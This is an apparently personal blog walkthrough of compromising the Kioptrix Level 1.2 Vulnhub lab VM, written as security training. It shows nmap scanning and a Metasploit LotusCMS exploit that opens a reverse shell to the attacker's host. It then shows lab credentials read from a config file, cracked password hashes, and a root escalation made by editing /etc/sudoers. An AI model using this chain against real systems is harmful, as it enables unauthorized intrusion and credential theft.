<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="KIOPTRIX LEVEL 1.2 (#3) - Vulnhub Walkthrough" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1.2/" /><meta property="og:url" content="http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1.2/" /><meta property="og:site_name" content="Mohamed Ayman" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-21T11:13:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="KIOPTRIX LEVEL 1.2 (#3) - Vulnhub Walkthrough" /><meta name="twitter:site" content="@MAAelHamid" /><meta name="google-site-verification" content="google-site-verification" /> <script type="application/ld+json"> {"description":"Introduction","headline":"KIOPTRIX LEVEL 1.2 (#3) - Vulnhub Walkthrough","url":"http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1.2/","@type":"BlogPosting","dateModified":"2021-08-13T21:26:09+02:00","datePublished":"2021-07-21T11:13:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://maaelhamid.github.io/posts/KIOPTRIX_LEVEL_1.2/"},"@context":"https://schema.org"}</script><title>KIOPTRIX LEVEL 1.2 (#3) - Vulnhub Walkthrough | Mohamed Ayman</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mohamed Ayman"><meta name="application-name" content="Mohamed Ayman"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://maaelhamid.github.io/assets/img/profile/av.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Mohamed Ayman</a></div><div class="site-subtitle font-italic">Offensive Security Enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/MAAelHamid" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/MAAelHamid" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['m.a.a.elhamid','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>KIOPTRIX LEVEL 1.2 (#3) - Vulnhub Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>KIOPTRIX LEVEL 1.2 (#3) - Vulnhub Walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Mohamed Ayman </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jul 21, 2021, 11:13 AM +0200" prep="on" > Jul 21 <i class="unloaded">2021-07-21T11:13:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Aug 13, 2021, 9:26 PM +0200" prefix="Updated " > Aug 13 <i class="unloaded">2021-08-13T21:26:09+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1570 words">8 min</span></div></div><div class="post-content"><h1 id="introduction">Introduction</h1><p>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p><h1 id="scanning">Scanning</h1><p>We first need to get the target IP.</p><p><code class="language-plaintext highlighter-rouge">nmap -sP 192.168.1.0/24</code></p><p>Target IP is <code class="language-plaintext highlighter-rouge">192.168.1.7</code></p><h2 id="nmap">nmap</h2><p><code class="language-plaintext highlighter-rouge">sudo nmap -sV -p- -O -T4 192.168.1.7</code></p><ul><li><code class="language-plaintext highlighter-rouge">-sV</code> determine service/version info<li><code class="language-plaintext highlighter-rouge">-T4</code> for faster execution<li><code class="language-plaintext highlighter-rouge">-p-</code> scan all ports<li><code class="language-plaintext highlighter-rouge">-O</code> identify Operating System</ul><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 07:48 EDT
Nmap scan report for 192.168.1.7
Host is up (0.00095s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.2
OS details: Linux 3.2
Network Distance: 2 hops
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.73 seconds

</span></pre></table></code></div></div><p>lets take a look on port <code class="language-plaintext highlighter-rouge">80</code></p><p><img data-proofer-ignore data-src="/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721082002919.png" alt="image-20210721082002919" /></p><p>hit login tab</p><p><img data-proofer-ignore data-src="/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721082028275.png" alt="image-20210721082028275" /></p><p>i tried to brute force credentials but no result</p><p>close enough …</p><p><img data-proofer-ignore data-src="/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721082214088.png" alt="image-20210721082214088" /></p><p>lets check this CMS</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="go">➜  ~ searchsploit lotuscms
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)          | php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                              | php/webapps/16982.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</span></pre></table></code></div></div><p>lets try this</p><p>​ <code class="language-plaintext highlighter-rouge">LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)</code></p><p># Gaining Access</p><p>fire msfconsole</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
</pre><td class="rouge-code"><pre><span class="gp">msf6 &gt;</span><span class="w"> </span>search lotuscms
<span class="go">
Matching Modules
================

</span><span class="gp">   #</span><span class="w">  </span>Name                              Disclosure Date  Rank       Check  Description
<span class="go">   -  ----                              ---------------  ----       -----  -----------
   0  exploit/multi/http/lcms_php_exec  2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/lcms_php_exec

</span><span class="gp">msf6 exploit(multi/http/lcms_php_exec) &gt;</span><span class="w"> </span>show payloads 
<span class="go">
Compatible Payloads
===================

</span><span class="gp">   #</span><span class="w">   </span>Name                                        Disclosure Date  Rank    Check  Description
<span class="go">   -   ----                                        ---------------  ----    -----  -----------
   0   payload/generic/custom                                       normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   4   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
   5   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
   6   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
   7   payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
   8   payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
   9   payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
   10  payload/php/exec                                             normal  No     PHP Execute Command
   11  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
   12  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
   13  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
   14  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
   15  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   16  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   17  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
   18  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)

</span><span class="gp">msf6 exploit(multi/http/lcms_php_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>2
<span class="go">[-] Unknown variable
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

</span><span class="gp">msf6 exploit(multi/http/lcms_php_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>payload 2
<span class="gp">payload =&gt;</span><span class="w"> </span>generic/shell_reverse_tcp
<span class="gp">msf6 exploit(multi/http/lcms_php_exec) &gt;</span><span class="w"> </span>options
<span class="go">
Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class="gp">   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;</span><span class="s1">'
</span><span class="go">   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.8      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


</span><span class="gp">msf6 exploit(multi/http/lcms_php_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>rhosts 192.168.1.7
<span class="gp">rhosts =&gt;</span><span class="w"> </span>192.168.1.7
<span class="gp">msf6 exploit(multi/http/lcms_php_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>uri /
<span class="gp">uri =&gt;</span><span class="w"> </span>/
<span class="gp">msf6 exploit(multi/http/lcms_php_exec) &gt;</span><span class="w"> </span>run
<span class="go">
[*] Started reverse TCP handler on 192.168.1.8:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
</span><span class="gp">[*] Command shell session 1 opened (192.168.1.8:4444 -&gt;</span><span class="w"> </span>192.168.1.7:33294<span class="o">)</span> at 2021-07-21 08:32:50 <span class="nt">-0400</span>
<span class="go">
whoami
www-data
</span><span class="gp">python -c 'import pty;</span><span class="w"> </span>pty.spawn<span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span><span class="s1">'
</span><span class="gp">$</span><span class="w"> 
</span><span class="go">
</span></pre></table></code></div></div><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Service Account Access</ul><p>check config files</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-name</span> <span class="s2">"*config.php"</span>
<span class="go">./gallery/gconfig.php
</span></pre></table></code></div></div><p>open this file</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="go">cat ./gallery/gconfig.php
&lt;?php
</span><span class="gp">	error_reporting(0);</span><span class="w">
</span><span class="go">	/*
		A sample Gallarific configuration file. You should edit
		the installer details below and save this file as gconfig.php
		Do not modify anything else if you don't know what it is.
	*/

	// Installer Details -----------------------------------------------

	// Enter the full HTTP path to your Gallarific folder below,
	// such as http://www.yoursite.com/gallery
	// Do NOT include a trailing forward slash

</span><span class="gp">	$</span>GLOBALS[<span class="s2">"gallarific_path"</span><span class="o">]</span> <span class="o">=</span> <span class="s2">"http://kioptrix3.com/gallery"</span><span class="p">;</span>
<span class="go">
</span><span class="gp">	$</span>GLOBALS[<span class="s2">"gallarific_mysql_server"</span><span class="o">]</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="gp">	$</span>GLOBALS[<span class="s2">"gallarific_mysql_database"</span><span class="o">]</span> <span class="o">=</span> <span class="s2">"gallery"</span><span class="p">;</span>
<span class="gp">	$</span>GLOBALS[<span class="s2">"gallarific_mysql_username"</span><span class="o">]</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
<span class="gp">	$</span>GLOBALS[<span class="s2">"gallarific_mysql_password"</span><span class="o">]</span> <span class="o">=</span> <span class="s2">"fuckeyou"</span><span class="p">;</span>
<span class="go">
	// Setting Details -------------------------------------------------

</span><span class="gp">if(!$</span>g_mysql_c <span class="o">=</span> @mysql_connect<span class="o">(</span><span class="nv">$GLOBALS</span><span class="o">[</span><span class="s2">"gallarific_mysql_server"</span><span class="o">]</span>, <span class="nv">$GLOBALS</span><span class="o">[</span><span class="s2">"gallarific_mysql_username"</span><span class="o">]</span>, <span class="nv">$GLOBALS</span><span class="o">[</span><span class="s2">"gallarific_mysql_password"</span><span class="o">]))</span> <span class="o">{</span>
<span class="gp">		echo("A connection to the database couldn't be established: " . mysql_error());</span><span class="w">
</span><span class="gp">		die();</span><span class="w">
</span><span class="go">}else {
</span><span class="gp">	if(!$</span>g_mysql_d <span class="o">=</span> @mysql_select_db<span class="o">(</span><span class="nv">$GLOBALS</span><span class="o">[</span><span class="s2">"gallarific_mysql_database"</span><span class="o">]</span>, <span class="nv">$g_mysql_c</span><span class="o">))</span> <span class="o">{</span>
<span class="gp">		echo("The Gallarific database couldn't be opened: " . mysql_error());</span><span class="w">
</span><span class="gp">		die();</span><span class="w">
</span><span class="go">	}else {
</span><span class="gp">		$</span><span class="nv">settings</span><span class="o">=</span>mysql_query<span class="o">(</span><span class="s2">"select * from gallarific_settings"</span><span class="o">)</span><span class="p">;</span>
<span class="gp">		if(mysql_num_rows($</span>settings<span class="o">)!=</span>0<span class="o">){</span>
<span class="gp">			while($</span><span class="nv">data</span><span class="o">=</span>mysql_fetch_array<span class="o">(</span><span class="nv">$settings</span><span class="o">)){</span>
<span class="gp">				$</span>GLOBALS[<span class="s2">"{</span><span class="nv">$data</span><span class="s2">['settings_name']}"</span><span class="o">]=</span><span class="nv">$data</span><span class="o">[</span><span class="s1">'settings_value'</span><span class="o">]</span><span class="p">;</span>
<span class="go">			}
		}
	
	}
}

</span><span class="gp">?&gt;</span><span class="w">
</span><span class="go">
</span></pre></table></code></div></div><p>Now we have username and password for <strong>phpmyadmin</strong></p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">	$</span>GLOBALS[<span class="s2">"gallarific_mysql_username"</span><span class="o">]</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
<span class="gp">	$</span>GLOBALS[<span class="s2">"gallarific_mysql_password"</span><span class="o">]</span> <span class="o">=</span> <span class="s2">"fuckeyou"</span><span class="p">;</span>
</pre></table></code></div></div><p>lets check it … <code class="language-plaintext highlighter-rouge">http://192.168.1.7/phpmyadmin/</code></p><p>we IN &lt;3</p><p><img data-proofer-ignore data-src="/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721084439010.png" alt="image-20210721084439010" /></p><p>after check existing DB i find this</p><p><img data-proofer-ignore data-src="/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721084611434.png" alt="image-20210721084611434" /></p><p><img data-proofer-ignore data-src="/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721084636459.png" alt="image-20210721084636459" /></p><p>open this table …</p><p><img data-proofer-ignore data-src="/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721084737831.png" alt="image-20210721084737831" /></p><p>Finding this … <strong>developer credentials</strong></p><p>but it hashed lets decrypt it using <strong>hashes.com</strong></p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">0d3eccfb887aabd50f243b3f155c0f85:Mast3r
5badcaf789d3d1d09794d8f021f40f0e:starwars
</span></pre></table></code></div></div><div class="table-wrapper"><table><thead><tr><th style="text-align: center">Username<th style="text-align: center">Password<tbody><tr><td style="text-align: center">dreg<td style="text-align: center">Mast3r<tr><td style="text-align: center">loneferret<td style="text-align: center">starwars</table></div><p>step back we still have shell</p><p>lets view <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd
<span class="go">cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
</span></pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">loneferret -&gt; /bin/bash</code></p><p>loneferret had normal shell lets try to hit it using ssh</p><blockquote><p>note : we avoid using dreg because account shell is restricted “rbash”</p></blockquote><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="go">➜  ~ ssh loneferret@192.168.1.7
The authenticity of host '192.168.1.7 (192.168.1.7)' can't be established.
RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.7' (RSA) to the list of known hosts.

loneferret@192.168.1.7's password: 
</span><span class="gp">Linux Kioptrix3 2.6.24-24-server #</span>1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
<span class="go">
</span><span class="gp">The programs included with the Ubuntu system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Wed Jul 21 08:25:04 2021 from 192.168.1.8
</span><span class="gp">loneferret@Kioptrix3:~$</span><span class="w"> 
</span><span class="go">
</span></pre></table></code></div></div><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Regular User Account Access</ul><h1 id="privilege-escalation">Privilege Escalation</h1><p>at this point we can run <code class="language-plaintext highlighter-rouge">enu4linux</code> but wait …</p><p>lets check user privilege</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">loneferret@Kioptrix3:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">User loneferret may run the following commands on this host:
    (root) NOPASSWD: /bin/su
    (root) NOPASSWD: /usr/local/bin/ht
</span></pre></table></code></div></div><p>check history</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">loneferret@Kioptrix3:~$</span><span class="w"> </span><span class="nb">history</span>
<span class="go">    1  sudo ht
    2  exit
    3  history 
</span></pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">sudo ht</code> looks juicy lets hit it …</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">loneferret@Kioptrix3:~$</span><span class="w"> </span><span class="nb">sudo </span>ht
<span class="go">Error opening terminal: xterm-256color.
</span><span class="gp">loneferret@Kioptrix3:~$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="gp">loneferret@Kioptrix3:~$</span><span class="w"> </span><span class="nb">sudo </span>ht
</pre></table></code></div></div><p>this Appear …</p><p><img data-proofer-ignore data-src="/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721090641998.png" alt="image-20210721090641998" /></p><p>its an IN-Terminal text editor like <em>nano, vim, …</em></p><p>we had <code class="language-plaintext highlighter-rouge">sudo</code> privilege with this app</p><p>lets try edit <code class="language-plaintext highlighter-rouge">/etc/sudoers</code></p><p><code class="language-plaintext highlighter-rouge">f3</code> to open file</p><p><img data-proofer-ignore data-src="/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721091146032.png" alt="image-20210721091146032" /></p><p>hit <code class="language-plaintext highlighter-rouge">enter</code> now we need to add <code class="language-plaintext highlighter-rouge">/bin/su</code> privilege to current account</p><p><img data-proofer-ignore data-src="/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721091327400.png" alt="image-20210721091327400" /></p><p><code class="language-plaintext highlighter-rouge">f2</code> save</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">loneferret@Kioptrix3:~$</span><span class="w"> </span><span class="nb">sudo </span>su
<span class="gp">root@Kioptrix3:/home/loneferret#</span><span class="w"> </span><span class="nb">cd</span>
<span class="gp">root@Kioptrix3:~#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">Congrats.txt  ht-2.0.18
</span><span class="gp">root@Kioptrix3:~#</span><span class="w"> </span><span class="nb">cat </span>Congrats.txt 
<span class="go">Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.
</span><span class="c">...
</span></pre></table></code></div></div><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Root User Account Access</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vlunhub/'>VlunHub</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/phpmyadmin/" class="post-tag no-text-decoration" >phpmyadmin</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a> <a href="/tags/ht/" class="post-tag no-text-decoration" >ht</a> <a href="/tags/sudoers/" class="post-tag no-text-decoration" >sudoers</a> <a href="/tags/kioptrix/" class="post-tag no-text-decoration" >kioptrix</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a 